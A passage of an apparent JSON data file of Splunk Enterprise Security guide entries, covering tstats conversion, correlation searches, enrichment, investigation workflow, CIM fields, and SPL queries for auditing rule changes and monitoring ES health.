        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Why Convert to tstats?</div>\n                    <div class=\"guide-detail-section\">\n                        <p><code>tstats</code> queries accelerated data models and can be 10-100x faster than raw index searches. For dashboards and reports, this makes a huge difference.</p>\n                        <p>The tradeoff: tstats only works with indexed fields in data models, not arbitrary fields.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Conversion Patterns</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Simple count</div>\n                        <p class=\"conversion-label\">Standard Splunk:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth action=failure | stats count</code></pre>\n                        </div>\n                        <p class=\"conversion-label\">Enterprise Security:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication where Authentication.action=\"failure\"</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count by field</div>\n                        <p class=\"conversion-label\">Standard Splunk:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth | stats count by user</code></pre>\n                        </div>\n                        <p class=\"conversion-label\">Enterprise Security:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication by Authentication.user</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Time chart</div>\n                        <p class=\"conversion-label\">Standard Splunk:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth | timechart count by action</code></pre>\n                        </div>\n                        <p class=\"conversion-label\">Enterprise Security:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats prestats=true count from datamodel=Authentication by _time Authentication.action span=1h\n| timechart span=1h count by Authentication.action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Note: timechart after tstats requires <code>prestats=true</code>.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">tstats Syntax Rules</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li>Fields must be fully qualified: <code>Authentication.user</code> not just <code>user</code></li>\n                            <li>Use <code>where</code> clause for filtering, not search terms</li>\n                            <li>Only aggregation functions work: count, sum, avg, min, max, dc, values</li>\n                            <li><code>summariesonly=true</code> for speed (may miss recent data)</li>\n                            <li><code>prestats=true</code> required before timechart or chart</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">When to Use Raw Search Instead</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li>Ad-hoc investigation with unknown fields</li>\n                            <li>Drilldowns that need raw event details</li>\n                            <li>Fields not included in the data model</li>\n                            <li>Complex string manipulation or regex</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use the \"Pivot\" interface (Settings  Data Models  your model  Pivot) to build tstats queries visually. It generates the SPL for you.</p>\n                </div>\n            "
      },
      {
        "id": "es-correlation-searches",
        "title": "Creating Correlation Searches",
        "description": "Build your own ES detection rules that create notables or risk events.",
        "keywords": "correlation search detection rule notable risk adaptive response action",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">What's a Correlation Search?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>In standard Splunk, you create \"Alerts\". In ES, you create \"Correlation Searches\" - scheduled searches that detect threats and trigger adaptive response actions (create notable, add risk, send email, etc.).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Anatomy of a Correlation Search</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li><strong>Search Logic</strong> - The SPL that detects the condition</li>\n                            <li><strong>Schedule</strong> - How often to run (cron or interval)</li>\n                            <li><strong>Throttling</strong> - Prevent duplicate alerts for same entity</li>\n                            <li><strong>Adaptive Response Actions</strong> - What happens when triggered</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Example: Brute Force Detection</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication\n    where Authentication.action=\"failure\"\n    by Authentication.src Authentication.user _time span=5m\n| where count > 10\n| rename Authentication.src as src, Authentication.user as user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Detects more than 10 failed logins in 5 minutes. The rename at the end makes fields available for notable event enrichment.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Adaptive Response Actions</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Create Notable Event</strong> - For high-fidelity detections requiring investigation</li>\n                            <li><strong>Create Risk Event</strong> - For lower-fidelity signals that contribute to RBA</li>\n                            <li><strong>Send Email</strong> - Immediate notification</li>\n                            <li><strong>Run Script</strong> - Custom automation</li>\n                            <li><strong>Send to UBA</strong> - Feed Splunk UBA for behavior analysis</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Setting Up in ES</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Navigate to: Configure  Content  Content Management  Create New Content  Correlation Search</p>\n                        <p>Fill in: Search, schedule, throttle window, and select adaptive response actions.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Always include <code>src</code>, <code>dest</code>, and <code>user</code> fields in your correlation search output when applicable. ES uses these for asset/identity enrichment and investigation drilldowns.</p>\n                </div>\n            "
      },
      {
        "id": "es-asset-identity",
        "title": "Asset and Identity Enrichment",
        "description": "How ES enriches events with context from your asset and identity databases.",
        "keywords": "asset identity enrichment lookup context business criticality priority owner",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Power of Context</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Raw logs tell you WHAT happened. Asset and identity data tells you WHO and WHERE. ES automatically enriches events with this context.</p>\n                        <p>Example: \"10.1.1.50\" becomes \"Finance Server - Critical - Owned by Treasury Dept\"</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">How Enrichment Works</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li><strong>Asset/Identity Lists</strong> - CSV or lookup tables with context data</li>\n                            <li><strong>ES Correlation</strong> - Matches IPs, hostnames, usernames against lists</li>\n                            <li><strong>Field Enrichment</strong> - Adds fields like priority, business_unit, owner</li>\n                            <li><strong>Notable Enhancement</strong> - Notables include enriched context</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Enrichment Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr>\n                                <th>Field</th>\n                                <th>Description</th>\n                            </tr>\n                            <tr>\n                                <td><code>priority</code></td>\n                                <td>critical, high, medium, low, unknown</td>\n                            </tr>\n                            <tr>\n                                <td><code>bunit</code></td>\n                                <td>Business unit (Finance, Engineering, etc.)</td>\n                            </tr>\n                            <tr>\n                                <td><code>category</code></td>\n                                <td>Asset type (server, workstation, network device)</td>\n                            </tr>\n                            <tr>\n                                <td><code>owner</code></td>\n                                <td>Responsible person or team</td>\n                            </tr>\n                            <tr>\n                                <td><code>is_expected</code></td>\n                                <td>Whether asset/user is known/expected</td>\n                            </tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Checking Enrichment Status</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">View asset lookup</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup asset_lookup_by_str | head 20</code></pre>\n                        </div>\n                        <div class=\"guide-detail-label\">View identity lookup</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup identity_lookup_expanded | head 20</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using Priority in Searches</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable src_priority=\"critical\" OR dest_priority=\"critical\"\n| table _time rule_name src dest src_priority dest_priority</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find notables involving critical assets. Priority is automatically added by enrichment.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Invest in your asset and identity data. Good enrichment dramatically improves triage speed. Analysts instantly know if an alert involves a critical server vs. a test machine.</p>\n                </div>\n            "
      },
      {
        "id": "es-investigation-workflow",
        "title": "ES Investigation Workflow",
        "description": "Step-by-step process for investigating notable events efficiently.",
        "keywords": "investigation workflow triage drilldown pivot analyst playbook",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Investigation Mindset</div>\n                    <div class=\"guide-detail-section\">\n                        <p>In standard Splunk, you write queries. In ES, you follow a structured workflow using purpose-built dashboards and drilldowns. The goal is speed and consistency.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step-by-Step Workflow</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li><strong>Triage</strong> - Review notable in Incident Review, check enrichment context</li>\n                            <li><strong>Claim</strong> - Assign to yourself, set status to \"In Progress\"</li>\n                            <li><strong>Pivot</strong> - Click entities (user, IP, host) to see related activity</li>\n                            <li><strong>Drilldown</strong> - Open Investigation dashboards for deeper analysis</li>\n                            <li><strong>Document</strong> - Add comments to the notable event</li>\n                            <li><strong>Resolve</strong> - Set final status and disposition</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key ES Dashboards</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Incident Review</strong> - Notable event queue and triage</li>\n                            <li><strong>Asset Investigator</strong> - All activity for a specific host/IP</li>\n                            <li><strong>Identity Investigator</strong> - All activity for a specific user</li>\n                            <li><strong>Risk Analysis</strong> - Risk scores and contributing events</li>\n                            <li><strong>Protocol Intelligence</strong> - Network traffic analysis</li>\n                            <li><strong>Access Anomalies</strong> - Unusual authentication patterns</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Quick Investigation Queries</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">All activity for an IP</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Network_Traffic where All_Traffic.src=\"10.1.1.100\" OR All_Traffic.dest=\"10.1.1.100\" by _time All_Traffic.action span=1h</code></pre>\n                        </div>\n                        <div class=\"guide-detail-label\">All activity for a user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication where Authentication.user=\"jsmith\" by _time Authentication.action Authentication.src</code></pre>\n                        </div>\n                        <div class=\"guide-detail-label\">Risk events for an entity</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk risk_object=\"jsmith\"\n| table _time source risk_score risk_message</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Right-click on values in ES dashboards to see the \"Actions\" menu. You can pivot to other dashboards, add to a notable, or search for that value across all data models.</p>\n                </div>\n            "
      },
      {
        "id": "es-common-cim-fields",
        "title": "Common CIM Field Reference",
        "description": "Quick reference for the most-used CIM fields across ES data models.",
        "keywords": "cim common information model fields reference standard normalized",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Why CIM Fields?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>CIM (Common Information Model) standardizes field names across data sources. Learning these fields once means you can search any data model effectively.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Universal Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr><th>Field</th><th>Meaning</th></tr>\n                            <tr><td><code>src</code></td><td>Source IP or hostname</td></tr>\n                            <tr><td><code>dest</code></td><td>Destination IP or hostname</td></tr>\n                            <tr><td><code>user</code></td><td>Username involved</td></tr>\n                            <tr><td><code>action</code></td><td>What happened (allowed, blocked, success, failure)</td></tr>\n                            <tr><td><code>app</code></td><td>Application name</td></tr>\n                            <tr><td><code>vendor_product</code></td><td>Source system identifier</td></tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Authentication Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr><th>Field</th><th>Meaning</th></tr>\n                            <tr><td><code>Authentication.action</code></td><td>success, failure</td></tr>\n                            <tr><td><code>Authentication.user</code></td><td>Account attempting auth</td></tr>\n                            <tr><td><code>Authentication.src</code></td><td>Source of auth attempt</td></tr>\n                            <tr><td><code>Authentication.dest</code></td><td>Target system</td></tr>\n                            <tr><td><code>Authentication.app</code></td><td>Authentication method/app</td></tr>\n                            <tr><td><code>Authentication.authentication_method</code></td><td>password, key, cert, etc.</td></tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Network Traffic Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr><th>Field</th><th>Meaning</th></tr>\n                            <tr><td><code>All_Traffic.src</code></td><td>Source IP</td></tr>\n                            <tr><td><code>All_Traffic.dest</code></td><td>Destination IP</td></tr>\n                            <tr><td><code>All_Traffic.src_port</code></td><td>Source port</td></tr>\n                            <tr><td><code>All_Traffic.dest_port</code></td><td>Destination port</td></tr>\n                            <tr><td><code>All_Traffic.action</code></td><td>allowed, blocked, dropped</td></tr>\n                            <tr><td><code>All_Traffic.bytes_in</code></td><td>Inbound bytes</td></tr>\n                            <tr><td><code>All_Traffic.bytes_out</code></td><td>Outbound bytes</td></tr>\n                            <tr><td><code>All_Traffic.transport</code></td><td>tcp, udp, icmp</td></tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Endpoint Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr><th>Field</th><th>Meaning</th></tr>\n                            <tr><td><code>Processes.process_name</code></td><td>Executable name</td></tr>\n                            <tr><td><code>Processes.process_path</code></td><td>Full path to executable</td></tr>\n                            <tr><td><code>Processes.parent_process_name</code></td><td>Parent process</td></tr>\n                            <tr><td><code>Processes.user</code></td><td>User running process</td></tr>\n                            <tr><td><code>Processes.dest</code></td><td>Endpoint hostname</td></tr>\n                            <tr><td><code>Processes.process_id</code></td><td>PID</td></tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Bookmark the official CIM documentation. When you need a field that's not in this quick reference, the full CIM spec has every field for every data model.</p>\n                </div>\n            "
      },
      {
        "id": "es-audit-trail",
        "title": "Auditing ES Configuration Changes",
        "description": "Track who enables, disables, or modifies correlation searches and ES rules.",
        "keywords": "audit trail configuration change correlation search enable disable modify governance compliance",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Why Audit ES Changes?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Enterprise Security gives teams granular control over detection rules. With that power comes risk - a disabled correlation search means blind spots. An overly broad modification can flood the queue with false positives.</p>\n                        <p>Auditing ES changes answers: <strong>Who changed what, when, and why?</strong></p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Where ES Stores Audit Data</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Splunk tracks configuration changes in several locations:</p>\n                        <ul>\n                            <li><code>index=_audit</code> - Core Splunk audit events (REST API calls, config changes)</li>\n                            <li><code>index=_internal</code> - Scheduler activity, saved search execution</li>\n                            <li><code>index=_configtracker</code> - Configuration file changes (if enabled)</li>\n                            <li><strong>ES Content Management</strong> - Stores rule metadata and status</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Track Correlation Search Changes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Detect enabled/disabled correlation searches</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit action=edit* savedsearch_name=*\n    (disabled=0 OR disabled=1)\n| eval change_type=case(\n    disabled=1, \"DISABLED\",\n    disabled=0, \"ENABLED\",\n    true(), \"MODIFIED\")\n| table _time, user, savedsearch_name, change_type, host\n| sort -_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Captures when correlation searches are toggled on or off.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">All saved search modifications</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail action=edit*\n    (info=savedsearch OR info=correlationsearches)\n| rex field=_raw \"name=(?<search_name>[^,\\]]+)\"\n| table _time, user, action, search_name, host, info\n| sort -_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Broader view of all saved search edits including correlation searches.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Track ES Content Management Changes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">ES-specific rule modifications</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail\n    (action=\"*ES*\" OR object=\"*correlationsearches*\" OR object=\"*governance*\")\n| table _time, user, action, object, operation, status\n| sort -_time</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">REST API changes to ES configs</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail\n    uri_path IN (\"*/saved/searches/*\", \"*/alerts/correlationsearches/*\", \"*/configs/conf-correlationsearches/*\")\n| eval endpoint=mvindex(split(uri_path, \"/\"), -1)\n| stats count, latest(_time) as last_change, values(action) as actions by user, endpoint\n| sort -last_change</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Tracks REST API calls that modify ES configurations.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Track Adaptive Response Changes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail\n    (action=\"*adaptive*\" OR object=\"*modalert*\" OR uri_path=\"*alert_actions*\")\n| table _time, user, action, object, uri_path\n| sort -_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Monitors changes to adaptive response actions (notable creation, risk scoring, etc.).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Build an ES Audit Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Summary of changes by user (last 7 days)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail earliest=-7d\n    (info=savedsearch OR object=\"*correlationsearch*\")\n| stats count as total_changes,\n    dc(savedsearch_name) as unique_searches_modified,\n    values(action) as action_types\n    by user\n| sort -total_changes</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Timeline of rule state changes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail action=edit*\n    (disabled=0 OR disabled=1)\n| timechart span=1d count by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Visualize who is making changes over time - useful for spotting unusual activity.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Alert on Critical Changes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Alert when high-priority rules are disabled</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail action=edit* disabled=1\n| lookup correlationsearch_lookup search_name as savedsearch_name OUTPUT severity\n| where severity IN (\"critical\", \"high\")\n| table _time, user, savedsearch_name, severity, host</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Create an alert from this search to notify when critical detection rules go offline.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Detect bulk rule changes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail action=edit* earliest=-1h\n| stats dc(savedsearch_name) as rules_changed by user\n| where rules_changed > 5\n| table user, rules_changed</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Alert when someone modifies many rules at once - could indicate unauthorized changes or mistakes.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Audit Fields Reference</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr><th>Field</th><th>Description</th></tr>\n                            <tr><td><code>user</code></td><td>Who made the change</td></tr>\n                            <tr><td><code>action</code></td><td>Type of action (edit, delete, create)</td></tr>\n                            <tr><td><code>savedsearch_name</code></td><td>Name of the modified search</td></tr>\n                            <tr><td><code>disabled</code></td><td>1=disabled, 0=enabled</td></tr>\n                            <tr><td><code>object</code></td><td>Configuration object type</td></tr>\n                            <tr><td><code>uri_path</code></td><td>REST endpoint called</td></tr>\n                            <tr><td><code>operation</code></td><td>Specific operation performed</td></tr>\n                            <tr><td><code>info</code></td><td>Additional context about the change</td></tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Enable Enhanced Auditing</div>\n                    <div class=\"guide-detail-section\">\n                        <p>For deeper visibility, enable configuration tracking in <code>audit.conf</code>:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>[eventSigningKeys]\nauditTrailSigningKey = &lt;your-key&gt;\n\n[auditTrail]\nenableAuditTrailStoreSearch = true</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Consult Splunk docs for your version - audit capabilities vary.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Create a \"Detection Coverage\" dashboard that shows all correlation searches, their current state (enabled/disabled), last modification date, and who modified them. This gives leadership visibility into detection posture and change history at a glance.</p>\n                </div>\n            "
      },
      {
        "id": "es-self-auditing-framework",
        "title": "Building an ES Self-Auditing Framework",
        "description": "Comprehensive approach to monitoring your ES environment health and governance.",
        "keywords": "self audit framework governance health monitoring compliance soc maturity",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Self-Auditing Mindset</div>\n                    <div class=\"guide-detail-section\">\n                        <p>ES is a complex system with many moving parts. A self-auditing framework answers three questions:</p>\n                        <ul>\n                            <li><strong>Is ES working?</strong> - Are searches running, data flowing, alerts firing?</li>\n                            <li><strong>Is ES being used correctly?</strong> - Are analysts triaging notables, following process?</li>\n                            <li><strong>Is ES being managed properly?</strong> - Are changes controlled, documented, appropriate?</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Pillar 1: Operational Health</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Correlation search execution status</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_internal sourcetype=scheduler savedsearch_name=\"*\" app=\"*ES*\" OR app=\"SA-*\"\n| stats count, avg(run_time) as avg_runtime,\n    sum(eval(if(status=\"success\",1,0))) as successes,\n    sum(eval(if(status!=\"success\",1,0))) as failures\n    by savedsearch_name\n| eval health=round((successes/(successes+failures))*100,1).\"%\"\n| sort -failures</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Identify correlation searches that are failing or running slowly.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Data model acceleration lag</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| rest /services/admin/summarization by_tstats=t splunk_server=local\n| eval lag_minutes=round((now()-tstats_latest_time)/60,0)\n| table title, tstats_latest_time, lag_minutes, complete\n| where lag_minutes > 15\n| sort -lag_minutes</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Data model acceleration lag means tstats queries return stale results.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Pillar 2: Analyst Activity</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Notable event handling metrics</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable earliest=-7d\n| stats count as total,\n    sum(eval(if(status_group=\"closed\",1,0))) as closed,\n    sum(eval(if(status_group=\"new\",1,0))) as untouched,\n    avg(eval(if(status_group=\"closed\", _time-orig_time, null()))) as avg_resolution_time\n| eval close_rate=round((closed/total)*100,1).\"%\"\n| eval avg_resolution_hours=round(avg_resolution_time/3600,1)</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Activity by analyst</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable earliest=-7d status_group!=\"new\"\n| stats dc(event_id) as notables_worked,\n    dc(rule_name) as unique_rules,\n    latest(_time) as last_activity\n    by owner\n| sort -notables_worked</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Track analyst workload distribution and identify bottlenecks.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Notables aging without action</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable status_group=\"new\" owner=\"unassigned\"\n| eval age_hours=round((now()-_time)/3600,1)\n| where age_hours > 24\n| stats count by rule_name, urgency\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find notables sitting untouched - indicates capacity issues or ignored alert types.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Pillar 3: Configuration Governance</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Current rule inventory</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| rest /services/saved/searches splunk_server=local\n| search action.correlationsearch.enabled=1 OR is_scheduled=1\n| eval status=if(disabled=0,\"enabled\",\"disabled\")\n| stats count by status, eai:acl.app\n| sort -count</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Rules without recent results</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| rest /services/saved/searches splunk_server=local\n| search action.correlationsearch.enabled=1 disabled=0\n| join type=left title\n    [search index=notable earliest=-30d | stats count, latest(_time) as last_fired by search_name | rename search_name as title]\n| where isnull(count) OR count=0\n| table title, eai:acl.app, cron_schedule</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Enabled rules that haven't fired in 30 days - may indicate broken logic or missing data.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Recent configuration changes (summary)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=_audit sourcetype=audittrail earliest=-7d\n    (info=savedsearch OR object=\"*correlationsearch*\")\n    action IN (\"edit\", \"delete\", \"create\")\n| stats count by user, action\n| sort -count</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Pillar 4: Detection Coverage</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">MITRE ATT&CK coverage (if tagged)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| rest /services/saved/searches splunk_server=local\n| search action.correlationsearch.enabled=1 disabled=0\n| rex field=action.correlationsearch.annotations max_match=0 \"mitre_attack\":\"(?<technique>[^\"]+)\"\n| mvexpand technique\n| stats dc(title) as rules_count by technique\n| sort -rules_count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">If your rules are MITRE-tagged, see which techniques have coverage.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Coverage by security domain</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| rest /services/saved/searches splunk_server=local\n| search action.correlationsearch.enabled=1 disabled=0\n| stats count by action.correlationsearch.security_domain\n| rename action.correlationsearch.security_domain as domain</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Building Your Audit Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Combine these searches into a single dashboard with panels for:</p>\n                        <ul>\n                            <li><strong>Health Score</strong> - % of correlation searches running successfully</li>\n                            <li><strong>Data Freshness</strong> - Data model acceleration status</li>\n                            <li><strong>Queue Status</strong> - Open notables by age and urgency</li>\n                            <li><strong>Analyst Metrics</strong> - Workload and close rates</li>\n                            <li><strong>Change Log</strong> - Recent configuration modifications</li>\n                            